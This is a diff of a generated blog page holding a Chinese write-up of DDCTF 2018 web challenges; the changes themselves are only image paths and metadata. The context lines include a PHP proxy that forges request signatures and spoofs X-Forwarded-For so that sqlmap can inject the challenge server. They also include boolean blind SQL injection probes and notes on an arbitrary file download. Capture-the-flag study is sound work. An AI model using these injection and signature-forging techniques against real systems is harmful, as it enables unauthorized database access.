@@ -87,13 +87,13 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="Web 1 数据库的秘密题目地址：http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php Henryzhao师傅的解法使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入。 1234567891011121314151617181920212223242526272829">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/复现-思考-DDCTF-web/b.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/复现-思考-DDCTF-web/2.png">
-<meta property="og:updated_time" content="2018-04-26T04:03:42.387Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/b.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/2.png">
+<meta property="og:updated_time" content="2019-02-21T11:58:50.317Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="复现&amp;&amp;思考 DDCTF web">
 <meta name="twitter:description" content="Web 1 数据库的秘密题目地址：http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php Henryzhao师傅的解法使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入。 1234567891011121314151617181920212223242526272829">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/复现-思考-DDCTF-web/b.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/24/复现-思考-DDCTF-web/b.png">
 
 
 
@@ -395,7 +395,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$id = $_REQUEST[<span class="string">'id'</span>];</span><br><span class="line">@$title = $_REQUEST[<span class="string">'title'</span>];</span><br><span class="line">@$author = $_REQUEST[<span class="string">'author'</span>];</span><br><span class="line">@$date = $_REQUEST[<span class="string">'date'</span>];</span><br><span class="line">$time = time();</span><br><span class="line">$sig = sha1(<span class="string">'id='</span>.$id.<span class="string">'title='</span>.$title.<span class="string">'author='</span>.$author.<span class="string">'date='</span>.$date.<span class="string">'time='</span>.$time.<span class="string">'adrefkfweodfsdpiru'</span>);</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line">$post = [</span><br><span class="line">    <span class="string">'id'</span> =&gt; $id,</span><br><span class="line">    <span class="string">'title'</span> =&gt; $title,</span><br><span class="line">    <span class="string">'author'</span> =&gt; $author,</span><br><span class="line">    <span class="string">'date'</span> =&gt; $date,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_URL,<span class="string">"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 123.232.23.245'</span>,</span><br><span class="line">    ));</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$ch_out = curl_exec($ch);</span><br><span class="line">$ch_info = curl_getinfo($ch);</span><br><span class="line"></span><br><span class="line">$header = substr($ch_out, <span class="number">0</span>, $ch_info[<span class="string">'header_size'</span>]);</span><br><span class="line">$body = substr($ch_out, $ch_info[<span class="string">'header_size'</span>]);</span><br><span class="line"></span><br><span class="line">http_response_code($ch_info[<span class="string">'http_code'</span>]);</span><br><span class="line"><span class="comment">//header($header);</span></span><br><span class="line"><span class="comment">//echo $header;</span></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>
 <p>自己用python编写一个代理 TO DO:</p>
 <h3 id="Wfox师傅的解法"><a href="#Wfox师傅的解法" class="headerlink" title=" Wfox师傅的解法"></a><a href="https://mp.weixin.qq.com/s/7stIjwBhk6LP32m5KeHhmA" target="_blank" rel="noopener"> Wfox师傅的解法</a></h3><p>解锁了burpsuite的”新功能”: burpsuite的match and replace</p>
-<p><img src="复现-思考-DDCTF-web/b.png" alt=""></p>
+<p><img src="b.png" alt=""></p>
 <p>并不知道大佬是如何fuzz测试的，自己的测试流程：</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="keyword">and</span> <span class="number">1</span><span class="comment"># 正常显示admin的执行结果</span></span><br><span class="line">admin' <span class="keyword">and</span> <span class="number">0</span><span class="comment"># 显示为空</span></span><br></pre></td></tr></table></figure>
 <p>所以为布尔盲注 判断条件为response body中是否有admin/test的返回结果！</p>
@@ -412,7 +412,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>滴滴一下，让出行更美好<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> <span class="attr">href</span>=<span class="string">"http://www.xiaojukeji.com/images/favicon.ico"</span> <span class="attr">rel</span>=<span class="string">"icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/image/banner/ZmF2aWNvbi5pY28="</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>将链接后面的 base64 解码得到<code>favicon.ico</code>，010 Editor打开图片，发现<code>you can only download .class .xml .ico .ks files</code>,可以判断存在任意文件下载漏洞。</p>
 <p>Henryzhao师傅更厉害，直接观察出logo的异常…</p>
-<p><img src="复现-思考-DDCTF-web/2.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
 <p>另外，在师父的指导下可以通过Github源码泄露找到相似的模板，也就是整个网站的基本结构</p>
 <p>Spring的默认配置文件：applicationContext.xml，可以制定配置文件，一般命名为web.xml</p>
 <p>从500报错页面中find</p>
@@ -579,7 +579,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
